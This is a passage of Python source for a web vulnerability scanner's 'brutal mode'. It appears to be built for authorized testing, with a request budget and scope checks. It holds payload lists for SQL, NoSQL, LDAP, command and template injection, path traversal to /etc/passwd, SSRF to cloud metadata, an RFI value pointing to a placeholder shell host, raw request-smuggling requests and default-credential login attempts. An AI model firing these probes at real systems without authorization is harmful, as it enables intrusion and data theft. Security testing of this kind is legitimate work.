"""Brutal mode — the deep, active battery for authorized targets only.

Where normal checks are polite and passive-leaning, brutal tries "every
possible thing" that can be automated *safely*, organized into batteries:

  01 SQL injection        error / boolean-blind / time-based / UNION
  02 NoSQL                operator injection ($ne/$gt/$regex)
  03 LDAP / XPath         filter & predicate injection
  04 OS command           evidence + time-based
  05 SSTI / code / EL     template math evaluation across engines
  06 Path traversal / LFI traversal, null-byte, RFI signals
  07 SSRF                 metadata/file targets; optional canary callbacks
  08 Request smuggling    CL.TE / TE.CL desync on one raw connection
  09 Cache & headers      unkeyed header reflection (poisoning candidates)
  10 CORS                 origin reflection + preflight
  11 DOM XSS              source→sink dataflow in page JS
  12 Authentication       enumeration, default creds, rate limiting
  13 JWT & sessions       alg=none, unusual algs, client-exposed tokens
  14 IDOR / access ctrl   unauthenticated object endpoints (provable),
                          increment signals (info-only, manual follow-up)
  15 API security         GraphQL introspection, data exposure, pagination,
                          method override
  16 Debug/infra surface  phpinfo, actuator, pprof, manifests, logs
  17 File upload          acceptance vs *verified execution* (distinct)
  18 XXE                  external entity file read on XML endpoints
  19 Takeover (opt-in)    subdomain probing is OFF by default — discovered
                          subdomains are reported as DNS information, never
                          auto-fetched. Explicit consent required.
  20 Coverage report      what was automated vs what REQUIRES manual testing

Hard guarantees (enforced by architecture, not discipline):
  1. The ONLY way to make an HTTP request is through the budget-aware
     wrappers ``_bget``/``_bpost``/``_boptions`` — every request spends
     exactly one budget unit BEFORE any traffic leaves, and every request
     goes through the scoped ``RateLimitedClient``. The budget is therefore
     mathematically airtight: requests ≤ BRUTAL_BUDGET.
  2. Payload strings are values, never fetched. No destructive payloads.
  3. Findings require evidence; signals ship as info/low with honest titles.
"""
from __future__ import annotations

import asyncio
import base64
import json
import os
import re
import time
import uuid
from urllib.parse import urlsplit

import httpx

from .checks import ERROR_RX, _swap_param
from .http_client import RateLimitedClient, ScopeViolation, origin_of
from .models import CrawlResult, Finding, ScanConfig

BRUTAL_BUDGET = 400          # hard cap: max requests brutal may ever send
TIMING_THRESHOLD = 3.5       # seconds over baseline to count as time-based
MAX_UPLOAD_PROBES = 3

# ---------------------------------------------------------------- payloads

SQLI_ERROR = ["'", "\""]
SQLI_BLIND = [("'", "' AND '1'='1", "' AND '1'='2"),
              ("", "' AND 1=1-- -", "' AND 1=2-- -")]
SQLI_TIME = ["' AND SLEEP(6)-- -", "'; WAITFOR DELAY '0:0:6'--", "' || pg_sleep(6)--"]
SQLI_UNION = ["' UNION SELECT NULL-- -", "' UNION SELECT NULL,NULL-- -"]

NOSQL_PAYLOADS = ['{"$ne": null}', '{"$gt": ""}']
LDAP_PAYLOADS = ["*)(|(password=*)", "admin)(&)"]
XPATH_PAYLOADS = ["' or '1'='1", "'] | //user/* | a[''"]
CMD_PAYLOADS = ["; id", "| id", "` id`", "$(id)"]
SSTI_MARKERS = [("__{{7*7}}__", "49"), ("__${7*7}__", "49"), ("__<%= 7*7 %>__", "49"),
                ("__#{7*7}__", "49"), ("__{{ 7*'7' }}__", "49")]
TRAVERSAL_PAYLOADS = ["../../../../etc/passwd", "....//....//....//etc/passwd",
                      "..%2f..%2f..%2f..%2fetc%2fpasswd", "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                      "../../../../etc/passwd%00.png"]
TRAVERSAL_EVIDENCE = re.compile(
    r"(root:x:0:0:|root:\*:0:0:|\[extensions\]|; for 16-bit app support)", re.I)
CMD_EVIDENCE = re.compile(r"uid=\d+\([a-z_][\w-]*\)\s+gid=\d+", re.I)
SSRF_PARAMS = ("url", "uri", "src", "source", "fetch", "proxy", "dest", "destination",
               "redirect", "callback", "feed", "image", "img", "doc", "load", "site",
               "html", "u", "link")
SSRF_TARGETS = [("http://169.254.169.254/latest/meta-data/",
                 re.compile(r"(ami-id|instance-id|private-?ip)")),
                ("file:///etc/passwd", TRAVERSAL_EVIDENCE)]
FILE_PARAMS = ("file", "path", "page", "include", "template", "download", "doc",
               "attachment", "read", "view", "lang", "module", "conf", "data", "name")

ADMIN_API_PATHS = [
    ("/phpinfo.php", "high", re.compile(r"phpinfo\(\)|PHP Version", re.I)),
    ("/info.php", "high", re.compile(r"phpinfo\(\)|PHP Version", re.I)),
    ("/debug/vars", "high", re.compile(r'"?cmdline"?|"?memstats"?')),
    ("/debug/pprof/", "high", re.compile(r"Types of profiles available|/debug/pprof")),
    ("/server-status", "medium", re.compile(r"Apache Server Status", re.I)),
    ("/actuator/env", "high", re.compile(r"propertySources|\"activeProfiles\"")),
    ("/metrics", "low", re.compile(r"^# HELP", re.M)),
    ("/adminer.php", "high", re.compile(r"Adminer|Login<\/span> to database", re.I)),
    ("/storage/logs/laravel.log", "high", re.compile(r"\[\d{4}-\d{2}-\d{2}|stack trace|ERROR", re.I)),
    ("/composer.json", "info", re.compile(r'"require"|"name"')),
    ("/package.json", "info", re.compile(r'"dependencies"|"name"')),
    ("/.git/config", "critical", re.compile(r"\[core\]|repositoryformatversion")),
    ("/WEB-INF/web.xml", "high", re.compile(r"<web-app|<servlet", re.I)),
]

TAKEOVER_FPS = [
    ("AWS S3 bucket", re.compile(r"NoSuchBucket|The specified bucket does not exist", re.I), "high"),
    ("GitHub Pages", re.compile(r"There isn't a GitHub Pages site here", re.I), "high"),
    ("Azure Cloud", re.compile(r"404 Web Site not found", re.I), "high"),
    ("Heroku", re.compile(r"No such app|herokucdn\.com/error-pages", re.I), "high"),
    ("Fastly", re.compile(r"Fastly error: unknown domain", re.I), "high"),
    ("Shopify", re.compile(r"Sorry, this shop is currently unavailable", re.I), "high"),
    ("Zendesk", re.compile(r"Help Center Closed", re.I), "medium"),
]
JWTS_RX = re.compile(r"eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{4,}\.?[A-Za-z0-9_.-]*")
WS_RX = re.compile(r"\bwss?://[\w.-]+")
DATA_EXPOSURE_RX = re.compile(
    r'"(password_hash|passwordHash|secret|api_?key|private_?key|token|session_?secret)"\s*:', re.I)
GRAPHQL_PATHS = ("/graphql", "/api/graphql", "/graphiql", "/graphql/v1")


def _f(title, sev, cat, url, desc, rem, cwe, ev="", confidence="high") -> Finding:
    return Finding(title=title, severity=sev, category=cat, url=url, description=desc,
                   remediation=rem, cwe=cwe, evidence=ev[:400], confidence=confidence)


class _Budget:
    """Counting is centralized here: one unit per request, spent before sending."""

    def __init__(self, cap: int):
        self.left = cap
        self.spent = 0

    def spend(self, n: int = 1) -> bool:
        if self.left < n:
            return False
        self.left -= n
        self.spent += n
        return True

    @property
    def exhausted(self) -> bool:
        return self.left <= 0


# ----------------------------------------------- the ONLY request entrypoints

async def _safe(client: RateLimitedClient, budget: _Budget, method: str, url: str, **kw):
    """Budget + scope enforced before any traffic leaves. Returns None on
    refusal/exhaustion/error — callers treat None as 'no evidence'."""
    if not budget.spend():
        return None
    try:
        r = await client.request(method, url, **kw)
        return r
    except (httpx.HTTPError, ValueError, ScopeViolation):
        return None


async def _bget(client, budget, url, **kw):
    return await _safe(client, budget, "GET", url, **kw)


async def _bpost(client, budget, url, **kw):
    return await _safe(client, budget, "POST", url, **kw)


async def _boptions(client, budget, url, **kw):
    return await _safe(client, budget, "OPTIONS", url, **kw)


# ------------------------------------------------------------ batteries 01-06

async def bat_sqli(cfg, client, budget, params, base, log) -> list[Finding]:
    out: list[Finding] = []
    seen: set = set()
    for url, param in params:
        path = url.split("?")[0]
        if path in seen or budget.exhausted:
            continue
        seen.add(path)

        # error-based
        hit = False
        for p in SQLI_ERROR:
            r = await _bget(client, budget, _swap_param(url, param, p))
            if r and ERROR_RX.search(r.text or ""):
                out.append(_f(f"Error-based SQL injection in '{param}'", "critical", "SQL Injection",
                              _swap_param(url, param, p),
                              "A malformed value produces a database error — the parameter reaches a SQL parser.",
                              "Parameterize queries; never concatenate input into SQL; suppress DB errors.", "CWE-89",
                              ERROR_RX.search(r.text).group(0)[:120]))
                hit = True
                break

        # boolean blind: differential between true/false conditions
        # (independent evidence from the error check — a target can leak both)
        for _init, ptrue, pfalse in SQLI_BLIND:
            rt = await _bget(client, budget, _swap_param(url, param, ptrue))
            rf = await _bget(client, budget, _swap_param(url, param, pfalse))
            if rt and rf and rt.status_code == rf.status_code:
                lt, lf = len(rt.text or ""), len(rf.text or "")
                if max(lt, lf) > 0 and abs(lt - lf) / max(lt, lf) > 0.3:
                    out.append(_f(f"Boolean blind SQL injection differential in '{param}'",
                                  "critical", "SQL Injection", _swap_param(url, param, ptrue),
                                  "True/false SQL conditions produce different responses — the value is interpreted as SQL.",
                                  "Parameterize queries; validate/allow-list input types.", "CWE-89",
                                  f"len(true)={lt} len(false)={lf}", confidence="medium"))
                    hit = True
                    break

        # time-based — INDEPENDENT evidence, always attempted: a target can
        # both echo a database error AND delay (error+time confirm each other)
        if not budget.exhausted:
            r0 = base.get(path)
            bt = r0[1] if r0 else 0.3
            for p in SQLI_TIME:
                t0 = time.perf_counter()
                r = await _bget(client, budget, _swap_param(url, param, p))
                dt = time.perf_counter() - t0
                if r and dt > max(bt * 3, TIMING_THRESHOLD):
                    out.append(_f(f"Time-based SQL injection in '{param}'", "critical", "SQL Injection",
                                  _swap_param(url, param, p),
                                  f"Response delayed {dt:.1f}s (baseline {bt:.1f}s) after a DB sleep payload.",
                                  "Parameterize queries; block DB sleep/delay functions for app accounts.", "CWE-89",
                                  f"delay {dt:.1f}s vs baseline {bt:.1f}s", confidence="medium"))
                    break
    return out


async def bat_union_sqli(cfg, client, budget, params) -> list[Finding]:
    out: list[Finding] = []
    seen: set = set()
    for url, param in params[:25]:
        if budget.exhausted or url.split("?")[0] in seen:
            continue
        seen.add(url.split("?")[0])
        for p in SQLI_UNION:
            r = await _bget(client, budget, _swap_param(url, param, p))
            if r and re.search(r"the used select statements have a different number of columns|"
                               r"each UNION query must have the same number of columns|"
                               r"UNION types .* cannot be matched", (r.text or ""), re.I):
                out.append(_f(f"UNION-based SQL injection accepted in '{param}'", "critical",
                              "SQL Injection", _swap_param(url, param, p),
                              "The UNION operator reached the SQL engine — attacker can read arbitrary tables.",
                              "Parameterize queries; reject control keywords in input.", "CWE-89",
                              re.search(r"number of columns|cannot be matched", (r.text or ""), re.I).group(0)[:120]))
                break
    return out


async def bat_injection_families(cfg, client, budget, params, base) -> list[Finding]:
    out: list[Finding] = []
    seen: set = set()
    for url, param in params:
        path = url.split("?")[0]
        if path in seen or budget.exhausted:
            continue
        seen.add(path)
        family_hits: list[tuple] = []

        # NoSQL operator injection
        for p in NOSQL_PAYLOADS:
            r = await _bget(client, budget, _swap_param(url, param, p))
            if r and re.search(r"(mongodb|mongoerror|cast to (object|string) failed|bson)", (r.text or ""), re.I):
                family_hits.append((f"NoSQL operator injection in '{param}'", "critical",
                                    "NoSQL Injection", "CWE-943",
                                    re.search(r"(mongo\w*|cast to \w+ failed)", (r.text or ""), re.I).group(0)))
                break

        # LDAP injection
        for p in LDAP_PAYLOADS:
            r = await _bget(client, budget, _swap_param(url, param, p))
            if r and re.search(r"(ldap|Bad search filter|Protocol error)", (r.text or ""), re.I):
                family_hits.append((f"LDAP filter injection in '{param}'", "high", "LDAP Injection",
                                    "CWE-90", "ldap filter error reflected"))
                break

        # XPath injection
        for p in XPATH_PAYLOADS:
            r = await _bget(client, budget, _swap_param(url, param, p))
            if r and re.search(r"(xpath|xmlXPath|Invalid predicate|XPathException)", (r.text or ""), re.I):
                family_hits.append((f"XPath injection in '{param}'", "high", "XPath Injection",
                                    "CWE-643", "xpath error reflected"))
                break

        # OS command injection: evidence then timing
        cmd_hit = False
        for p in CMD_PAYLOADS:
            r = await _bget(client, budget, _swap_param(url, param, p))
            if r and CMD_EVIDENCE.search(r.text or ""):
                family_hits.append((f"OS command injection in '{param}'", "critical",
                                    "OS Command Injection", "CWE-78",
                                    CMD_EVIDENCE.search(r.text).group(0)))
                cmd_hit = True
                break
        if not cmd_hit:
            r0 = base.get(path)
            bt = r0[1] if r0 else 0.3
            t0 = time.perf_counter()
            r = await _bget(client, budget, _swap_param(url, param, "; sleep 6 #"))
            dt = time.perf_counter() - t0
            if r and dt > max(bt * 3, TIMING_THRESHOLD):
                family_hits.append((f"OS command injection (time-based) in '{param}'", "critical",
                                    "OS Command Injection", "CWE-78", f"delay {dt:.1f}s vs {bt:.1f}s"))

        # SSTI / code / EL
        for p, result in SSTI_MARKERS:
            r = await _bget(client, budget, _swap_param(url, param, p))
            if r and result in (r.text or "") and p.strip("_") not in (r.text or ""):
                family_hits.append((f"Server-side template/code injection in '{param}'", "critical",
                                    "SSTI/Code Injection", "CWE-1336",
                                    f"template math evaluated: {p.strip('_')} → {result}"))
                break

        for (title, sev, cat, cwe, ev) in family_hits:
            out.append(_f(title, sev, cat, _swap_param(url, param, "<probe>"), title,
                          "Treat the value as untrusted: use safe APIs/parser flags, allow-list input, encode output.",
                          cwe, ev, confidence="medium"))
    return out


async def bat_traversal(cfg, client, budget, params) -> list[Finding]:
    out: list[Finding] = []
    candidates = [(u, p) for u, p in params if p.lower() in FILE_PARAMS][:15]
    for url, param in candidates:
        for p in TRAVERSAL_PAYLOADS[:4]:
            r = await _bget(client, budget, _swap_param(url, param, p))
            if r and TRAVERSAL_EVIDENCE.search(r.text or ""):
                out.append(_f(f"Path traversal / local file inclusion in '{param}'", "critical",
                              "Path Traversal/LFI", _swap_param(url, param, p),
                              "Arbitrary file read — server returns OS file content for a traversal value.",
                              "Resolve files against a fixed root; reject '..'; allow-list filenames.", "CWE-22",
                              TRAVERSAL_EVIDENCE.search(r.text).group(0)))
                break
        # RFI signal: error reveals remote fetch attempt (payload is a value,
        # never fetched by the scanner itself)
        r = await _bget(client, budget, _swap_param(url, param, "http://fsafe-rfi.invalid/shell.txt"))
        if r and re.search(r"(failed to open stream|include\(\)|fopen\(.*http://)", (r.text or ""), re.I):
            out.append(_f(f"Remote file inclusion signal in '{param}'", "critical",
                          "RFI", _swap_param(url, param, "http://…"),
                          "The application attempts to fetch and include a remote URL from user input.",
                          "Never pass URLs to include/require; map input to fixed server files.", "CWE-98",
                          "include/fopen error references remote URL", confidence="medium"))
    return out


# ------------------------------------------------------------ battery 07 SSRF

async def bat_ssrf(cfg, client, budget, params) -> list[Finding]:
    """Direct probes carry in-band evidence. For blind SSRF the scanner
    supports an optional canary: set FSAFE_CANARY_DOMAIN to a DNS/HTTP
    interaction server you control; unique per-probe subdomains let you
    attribute any callback to the exact parameter."""
    out: list[Finding] = []
    canary = os.environ.get("FSAFE_CANARY_DOMAIN", "").strip()
    seen: set = set()
    for url, param in params:
        if param.lower() not in SSRF_PARAMS or url.split("?")[0] in seen or budget.exhausted:
            continue
        seen.add(url.split("?")[0])
        for target, rx in SSRF_TARGETS:
            r = await _bget(client, budget, _swap_param(url, param, target))
            if r and rx.search(r.text or ""):
                out.append(_f(f"SSRF via parameter '{param}' (internal resource read)", "critical",
                              "SSRF", _swap_param(url, param, target),
                              "The server fetches an attacker-controlled URL and returns internal content — "
                              "cloud metadata / local files are reachable.",
                              "Allow-list outbound hosts; block link-local/metadata ranges; never fetch raw user URLs.",
                              "CWE-918", rx.search(r.text).group(0)))
                break
        if canary:
            token = uuid.uuid4().hex[:12]
            r = await _bget(client, budget,
                            _swap_param(url, param, f"http://{token}.{canary}/probe"))
            if r is not None:
                out.append(_f(f"Blind-SSRF canary planted via '{param}'", "info", "SSRF",
                              _swap_param(url, param, f"…{token}.{canary}"),
                              f"Canary URL {token}.{canary} was submitted. Check your interaction server for "
                              "DNS/HTTP callbacks — a hit proves server-side request forgery even with no visible response.",
                              "If callbacks arrive: allow-list outbound hosts, block internal ranges.", "CWE-918",
                              f"canary {token}.{canary} (verify callback server)", confidence="low"))
    return out


# ------------------------------------------------------- batteries 08-10

async def bat_smuggling(cfg, client, budget) -> list[Finding]:
    """CL.TE / TE.CL desync on one raw connection. Transport anomalies
    (timeout/close/TLS) are inconclusive — never a finding."""
    import ssl as _ssl
    out: list[Finding] = []
    u = urlsplit(cfg.url)
    host, port = u.hostname, u.port or (443 if u.scheme == "https" else 80)

    async def raw(payload: bytes) -> bytes | None:
        try:
            ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            sslargs = {"ssl": ctx} if u.scheme == "https" else {}
            r, w = await asyncio.wait_for(asyncio.open_connection(host, port, **sslargs), 6)
            w.write(payload)
            await w.drain()
            data = await asyncio.wait_for(r.read(2048), 5)
            w.close()
            return data
        except Exception:
            return None

    # two raw-socket probes, accounted explicitly (they are not HTTP client requests)
    if not budget.spend(2):
        return out
    p = (u.path or "/").encode()
    hosth = f"Host: {u.netloc}\r\n".encode()
    cl_te = (b"POST " + p + b" HTTP/1.1\r\n" + hosth +
             b"Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n"
             b"0\r\n\r\nGET /fsafe-smug-404 HTTP/1.1\r\n" + hosth + b"\r\n")
    te_cl = (b"POST " + p + b" HTTP/1.1\r\n" + hosth +
             b"Transfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n"
             b"1\r\nZ\r\nQ\r\n\r\nGET /fsafe-smug-404 HTTP/1.1\r\n" + hosth + b"\r\n")
    r1, r2 = await raw(cl_te), await raw(te_cl)
    if r1 and re.search(rb"HTTP/1\.[01] [45]\d\d", r1) and b"fsafe-smug-404" in r1:
        out.append(_f("HTTP request smuggling (CL.TE desync)", "high",
                      "HTTP Request Smuggling", cfg.url,
                      "The smuggled second request was processed by the back-end — connection poisoning confirmed.",
                      "Normalize Transfer-Encoding handling; reject CL+TE; use HTTP/2 end-to-end.", "CWE-444",
                      r1[:120].decode("latin-1", "replace"), confidence="medium"))
    elif r2 and re.search(rb"HTTP/1\.[01] [45]\d\d", r2) and b"Q" not in r2[:64]:
        out.append(_f("HTTP request smuggling (TE.CL desync)", "high",
                      "HTTP Request Smuggling", cfg.url,
                      "Front-end and back-end framed the TE+CL request differently.",
                      "Normalize Transfer-Encoding handling; reject CL+TE combination.", "CWE-444",
                      r2[:120].decode("latin-1", "replace"), confidence="low"))
    return out


async def bat_cache(cfg, client, budget) -> list[Finding]:
    out: list[Finding] = []
    r = await _bget(client, budget, cfg.url, headers={"X-Forwarded-Host": "fsafe-poison.example",
                                                      "X-Forwarded-Scheme": "http"})
    body = r.text or "" if r else ""
    if r and "fsafe-poison.example" in body:
        out.append(_f("Unkeyed header reflected (web-cache poisoning candidate)", "medium",
                      "Web Cache", cfg.url,
                      "X-Forwarded-Host is reflected into the response; a poisoned shared cache would serve attacker URLs.",
                      "Drop/normalize unkeyed headers before use; key the cache on them if used.", "CWE-444",
                      "reflected in response body", confidence="medium"))
    if r and "http://fsafe-poison.example" in body and (r.headers.get("location") or "").startswith("http://"):
        out.append(_f("X-Forwarded-Scheme downgrades generated URLs", "medium", "Web Cache",
                      cfg.url, "Scheme header alters generated links — enables mixed-content/cache attacks.",
                      "Derive scheme from the socket, not headers.", "CWE-345",
                      "http:// link generated", confidence="medium"))
    return out


async def bat_cors(cfg, client, budget) -> list[Finding]:
    out: list[Finding] = []
    evil = "https://fsafe-evil.example"
    r = await _bget(client, budget, cfg.url, headers={"Origin": evil})
    if r:
        acao = r.headers.get("access-control-allow-origin", "")
        acac = r.headers.get("access-control-allow-credentials", "")
        if acao == evil and acac.lower() == "true":
            out.append(_f("CORS reflects arbitrary origin with credentials", "high", "CORS",
                          cfg.url, "Any origin can read authenticated responses cross-site.",
                          "Allow-list origins exactly; do not reflect the Origin header.", "CWE-942",
                          f"ACAO: {acao} · ACAC: {acac}"))
        elif acao == evil or acao == "null":
            out.append(_f("CORS reflects arbitrary origin (no credentials)", "medium", "CORS",
                          cfg.url, "Origin reflection without credentials still leaks public data cross-site.",
                          "Allow-list origins; avoid 'null'.", "CWE-942", f"ACAO: {acao}", confidence="medium"))
    r2 = await _boptions(client, budget, cfg.url,
                         headers={"Origin": evil, "Access-Control-Request-Method": "POST"})
    if r2 and r2.headers.get("access-control-allow-origin", "") in ("*", evil):
        out.append(_f("Preflight allows arbitrary origin", "medium", "CORS", cfg.url,
                      "OPTIONS preflight grants broad cross-origin access.",
                      "Restrict Access-Control-Allow-Origin to trusted origins.", "CWE-942",
                      f"preflight ACAO: {r2.headers.get('access-control-allow-origin')}", confidence="medium"))
    return out


# ------------------------------------------------------------ batteries 11-13

async def bat_dom_xss(cfg, client, budget, crawl: CrawlResult) -> list[Finding]:
    out: list[Finding] = []
    sinks = re.compile(r"\.innerHTML\s*=|document\.write\(|\.outerHTML\s*=|eval\(|setTimeout\(\s*['\"]|"
                       r"document\.location\s*=|location\.href\s*=", re.I)
    sources = re.compile(r"location\.(search|hash|href)|document\.URL|document\.referrer|window\.name", re.I)
    for js_url, text in list(crawl.js_texts.items())[:40] + \
            [(p.url, s) for p in crawl.pages[:20] for s in p.inline_scripts]:
        if sinks.search(text or "") and sources.search(text or ""):
            out.append(_f("DOM XSS data-flow (source reaches sink)", "high", "XSS",
                          js_url or cfg.url,
                          "A DOM source (location.*) flows into a sink (innerHTML/eval/document.write) in page JavaScript.",
                          "Use textContent; validate/encode anything derived from location; audit sinks.", "CWE-79",
                          "source → sink pattern found", confidence="medium"))
    return out


async def bat_auth(cfg, client, budget, crawl: CrawlResult) -> list[Finding]:
    out: list[Finding] = []
    for form in [f for f in crawl.forms if f.has_password][:3]:
        action = form.action
        if origin_of(action) != origin_of(cfg.url):
            continue

        async def post_login(user: str, pw: str):
            data = {}
            for fld in form.fields:
                n = fld.name.lower()
                if "user" in n or n in ("login", "email", "name", "account"):
                    data[fld.name] = user
                elif "pass" in n:
                    data[fld.name] = pw
                elif fld.value:
                    data[fld.name] = fld.value
            return await _bpost(client, budget, action,
                                data=data or {"username": user, "password": pw})

        # username enumeration: identical wrong-password, differing messages
        r1 = await post_login("fsafe-nosuchuser", "wrongpass")
        r2 = await post_login("admin", "wrongpass")
        if r1 and r2 and r1.status_code == r2.status_code:
            l1, l2 = len(r1.text or ""), len(r2.text or "")
            if abs(l1 - l2) > 0.25 * max(l1, l2, 1):
                out.append(_f("Username enumeration via login response", "medium", "Authentication",
                              action, "Unknown-user and wrong-password responses differ, letting attackers enumerate accounts.",
                              "Return an identical generic message and status for both cases.", "CWE-204",
                              f"response sizes {l1} vs {l2}", confidence="medium"))

        # rate limiting: 6 rapid attempts
        codes = []
        for i in range(6):
            r = await post_login("fsafe-ratelimit-probe", f"wrongpass-{i}")
            codes.append(r.status_code if r else 0)
        if codes and all(c in (200, 302, 401) for c in codes):
            out.append(_f("No rate limiting / lockout observed on login (6 attempts)", "low",
                          "Authentication", action,
                          "Six consecutive failed logins met no 429/lockout — credential stuffing is feasible.",
                          "Rate-limit per-account and per-IP; add exponential backoff and alerting.", "CWE-307",
                          f"statuses {codes}", confidence="medium"))

        # default credentials — success needs unambiguous evidence
        for user, pw in (("admin", "admin"), ("root", "root"), ("admin", "password")):
            r = await post_login(user, pw)
            body = (r.text or "").lower() if r else ""
            success = r and (
                r.status_code in (301, 302, 303, 307)
                and "login" not in (r.headers.get("location") or "").lower()
                or (r.status_code == 200 and ("logout" in body or "welcome" in body or "dashboard" in body)
                    and not ("invalid" in body or "wrong" in body or "incorrect" in body or "unknown" in body)))
            if success:
                out.append(_f(f"Default credentials work: {user}:{pw}", "critical", "Authentication",
                              action, "Well-known default credentials authenticate successfully.",
                              "Remove default accounts; force unique passwords at install.", "CWE-798",
                              "login accepted default credentials", confidence="medium"))
                break
    return out


def bat_jwt_session(cfg, crawl: CrawlResult) -> list[Finding]:
    out: list[Finding] = []
    tokens: set = set()
    for text in list(crawl.js_texts.values()) + [p.content or "" for p in crawl.pages]:
        tokens.update(JWTS_RX.findall(text or ""))
    for tok in sorted(tokens)[:5]:
        try:
            head_b64 = tok.split(".")[0]
            head_b64 += "=" * (-len(head_b64) % 4)
            hdr = json.loads(base64.urlsafe_b64decode(head_b64))
        except Exception:
            continue
        alg = str(hdr.get("alg", "")).lower()
        if alg == "none":
            out.append(_f("JWT built with alg=none referenced in app assets", "high", "JWT",
                          cfg.url, "A token using the unsecured algorithm was observed; if accepted server-side it is trivially forgeable.",
                          "Reject alg=none/unsigned; pin expected algorithm server-side.", "CWE-347", tok[:60]))
        elif alg and alg not in ("hs256", "rs256", "es256"):
            out.append(_f(f"JWT uses unusual algorithm '{alg}'", "medium", "JWT", cfg.url,
                          "Non-standard JWT algorithm observed — verify server acceptance and key handling.",
                          "Allow-list algorithms; rotate keys; verify iss/aud/exp.", "CWE-347", tok[:60],
                          confidence="medium"))
    if tokens:
        out.append(_f("JWTs present in client-accessible assets", "info", "JWT", cfg.url,
                      f"{len(tokens)} JWT(s) appear in pages/scripts. Verify: signature validation, exp/aud checks, "
                      "storage (localStorage is XSS-readable), and absence of sensitive claims.",
                      "Keep tokens in HttpOnly cookies; validate all claims server-side.", "CWE-315"))
    return out


# ------------------------------------------------------------ battery 14-15

async def bat_idor(cfg, client, budget, crawl: CrawlResult) -> list[Finding]:
    """Two distinct verdicts:
    • PROVABLE: an object-returning API endpoint answers with no credentials
      at all → real missing-auth finding (high).
    • SIGNAL ONLY: incrementing a resource id also returns 200 with similar
      content → info-level recon signal; a genuine IDOR verdict requires a
      second authenticated account and is in the manual checklist."""
    out: list[Finding] = []
    u = urlsplit(cfg.url)
    root = f"{u.scheme}://{u.netloc}"

    # provable: unauthenticated object endpoints
    for path in ("/api/users/1", "/api/user/1", "/api/account/1", "/api/orders/1", "/api/admin/users"):
        r = await _bget(client, budget, root + path)
        if r and r.status_code == 200 and re.search(r"\{|email|\"name\"|\"user\"", r.text or "") \
                and not re.search(r"login|unauthorized|authenticate", (r.text or ""), re.I):
            out.append(_f(f"API data endpoint reachable without authentication: {path}", "high",
                          "Access Control/IDOR", root + path,
                          "An object-returning API path answered with object data and no credentials.",
                          "Require authentication + authorization on every endpoint; deny by default.", "CWE-306",
                          (r.text or "")[:120], confidence="medium"))

    # signal only: sequential ids — increment ONLY the identifier, never the
    # first digits found (127.0.0.1 is not a resource id!)
    numeric = re.compile(r"[?&/](id|user|uid|account|ref|order|invoice|doc)=[0-9]{1,8}\b|/(\d{1,6})(/|\?|$)", re.I)
    probed = sorted({p.url for p in crawl.pages[:60] if numeric.search(p.url)})[:8]
    for u2 in probed:
        m = (re.search(r"([?&/](?:id|user|uid|account|ref|order|invoice|doc)=)(\d{1,8})", u2, re.I)
             or re.search(r"(/)(\d{1,6})(/|\?|$)", u2))
        if not m:
            continue
        digits = m.group(2)
        nxt = u2[:m.start(2)] + str(int(digits) + 1) + u2[m.end(2):]
        r1, r2 = await _bget(client, budget, u2), await _bget(client, budget, nxt)
        if r1 and r2 and r1.status_code == 200 and r2.status_code == 200:
            la, lb = len(r1.text or ""), len(r2.text or "")
            if la and abs(la - lb) / max(la, lb) < 0.6:
                out.append(_f("Sequential resource identifiers observed (access-control signal)", "info",
                              "Access Control/IDOR", nxt,
                              "Incrementing the identifier returns another 200 response. This is a SIGNAL, not a "
                              "verified IDOR: the objects may be public, and object-level authorization can only be "
                              "proven with two controlled accounts (see manual checklist).",
                              "Verify with accounts A and B that A cannot read B's objects; enforce object-level checks.",
                              "CWE-639", f"{u2} → {nxt} both 200", confidence="low"))
    return out


async def bat_api(cfg, client, budget, crawl: CrawlResult) -> list[Finding]:
    out: list[Finding] = []
    u = urlsplit(cfg.url)
    root = f"{u.scheme}://{u.netloc}"

    # GraphQL introspection enabled
    for path in GRAPHQL_PATHS:
        r = await _bpost(client, budget, root + path, json={"query": "{__schema{types{name}}}"},
                         headers={"Content-Type": "application/json"})
        if r and r.status_code == 200 and re.search(r'"types"|"__schema"|"data"', r.text or ""):
            out.append(_f(f"GraphQL introspection enabled: {path}", "medium", "API Security",
                          root + path,
                          "The GraphQL schema is fully enumerable by any unauthenticated client — "
                          "attackers get a map of every type, field, and mutation.",
                          "Disable introspection in production; add depth/complexity limits and field-level authz.",
                          "CWE-200", (r.text or "")[:120], confidence="medium"))
            break

    # excessive data exposure in already-crawled JSON
    for p in crawl.pages:
        ct = (p.headers.get("content-type") or "").lower()
        if "json" not in ct:
            continue
        m = DATA_EXPOSURE_RX.search(p.content or "")
        if m:
            out.append(_f("Possible sensitive field exposure in API response", "medium", "API Security",
                          p.url, f"Response JSON contains a field matching '{m.group(1)}' — verify it is not a "
                          "secret/hash/token leaked to clients.",
                          "Filter serializer fields; never emit secrets, hashes, or internal tokens.", "CWE-200",
                          m.group(0)[:80], confidence="low"))
            break

    # pagination abuse signal: unbounded limit accepted
    r = await _bget(client, budget, root + "/api/items?limit=999999")
    if r and r.status_code == 200 and len(r.text or "") > 100_000:
        out.append(_f("Pagination accepts unbounded limit (data bulk signal)", "low", "API Security",
                      root + "/api/items?limit=999999",
                      "An extreme limit returned a very large payload — bulk extraction is cheap for attackers.",
                      "Cap page size server-side; enforce max limits.", "CWE-770",
                      f"payload {len(r.text)} bytes", confidence="low"))

    # method override honored? (probe via header on the root endpoint)
    r = await _bpost(client, budget, root + "/", data={},
                     headers={"X-HTTP-Method-Override": "DELETE"})
    if r and r.status_code in (200, 204) and not re.search(r"(not allowed|forbidden|error)", (r.text or ""), re.I):
        out.append(_f("X-HTTP-Method-Override appears honored", "low", "API Security", root + "/",
                      "The framework processed a POST as DELETE via override header — method-based authz can be bypassed.",
                      "Disable method override; authorize on the real operation.", "CWE-650",
                      f"status {r.status_code}", confidence="low"))
    return out


# ------------------------------------------------------------ batteries 16-18

async def bat_debug(cfg, client, budget) -> list[Finding]:
    out: list[Finding] = []
    u = urlsplit(cfg.url)
    root = f"{u.scheme}://{u.netloc}"
    for path, sev, rx in ADMIN_API_PATHS:
        r = await _bget(client, budget, root + path)
        if r and r.status_code == 200 and rx.search(r.text or ""):
            out.append(_f(f"Exposed debug/management surface: {path}", sev,
